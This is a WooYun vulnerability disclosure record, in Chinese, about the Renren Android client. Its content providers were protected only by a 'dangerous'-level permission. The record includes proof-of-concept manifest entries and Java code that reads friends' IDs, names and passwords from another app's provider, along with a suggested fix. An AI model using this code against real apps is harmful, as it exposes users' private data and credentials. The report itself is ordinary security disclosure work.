{"id": 4875, "wybug_id": "wooyun-2014-048778", "wybug_title": "人人客户端google play版  权限问题可导致隐私泄露", "wybug_corp": "人人网", "wybug_author": "段誉", "wybug_date": "2014-01-13 17:05", "wybug_open_date": "2014-04-13 17:06", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向公众公开  简要描述： 人人客户端google play 版权限问题导致隐私泄露 详细说明：  android客户端 google play 最新版        <provider android:name=\".contentprovider.AccountProvider\" android:permission=\"com.renren.xiaonei.android.permission.PERMISSION_ADD_ACCOUNT\" android:authorities=\"com.renren.xiaonei.account\" />        <provider android:name=\".contentprovider.BaseProvider\" android:permission=\"com.renren.xiaonei.android.permission.PERMISSION_ADD_ACCOUNT\" android:authorities=\"com.renren.xiaonei.base\" />虽然有com.renren.mobile.android.permission.PERMISSION_ADD_ACCOUNT，但是权限只是android:protectionLevel=\"dangerous\"，这个不够，声明这个权限又能够读取到信息以.contentprovider.BaseProvider为例，读取数据库中获取好友信息，人人消息等重要信息主要利用代码:manifest中需要声明<permission android:name=\"com.renren.mobile.android.permission.PERMISSION_ADD_ACCOUNT\" android:protectionLevel=\"dangerous\" /><uses-permission android:name=\"com.renren.mobile.android.permission.PERMISSION_ADD_ACCOUNT\" />代码中:private void renren(){int i = 0;ContentResolver contentresolver = getContentResolver();Uri uri = Uri.parse(\"content://com.renren.xiaonei.base/friends\");Cursor cursor = contentresolver.query(uri, null, null, null, null);do{if (!cursor.moveToNext()){Log.i(\"TEST\",String.valueOf(i));return;}Log.i(\"TEST\", (new StringBuilder(\"id=\")).append(cursor.getInt(0)).append(\",name=\").append(cursor.getString(2)).append(\",passwd=\").append(cursor.getString(3)).toString());i++;} while (true);}   漏洞证明：  \n\n   修复方案：  android:protectionLevel=\"dangerous\"还是不够，再高点即可   版权声明：转载请注明来源 段誉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2014-01-14 18:37 厂商回复： ths 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}